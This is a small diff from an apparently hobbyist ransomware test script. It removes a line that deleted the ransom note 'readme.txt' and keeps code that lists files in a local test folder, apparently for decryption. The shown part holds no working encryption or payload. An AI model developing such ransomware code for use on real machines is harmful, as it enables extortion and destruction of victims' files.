@@ -25,7 +25,6 @@ if __name__ == '__main__':   # https://www.geeksforgeeks.org/what-does-the-if-__
     # still got to discover how to get username xd
 
     path_to_encrypt = 'C:\\Users\\RitaAlonsoCasablanca\\Desktop\\malware\\ransomware_versions_test\\files'
-    os.remove(path_to_encrypt+'\\'+'readme.txt') # remove the ransom file
 
     items = os.listdir(path_to_encrypt)  #store in the variable items the items that exist in the path, listed by the function listdir 
     full_path = [path_to_encrypt+'\\'+item for item in items]  # this stores the path to every single element of the directory to decrypt ()
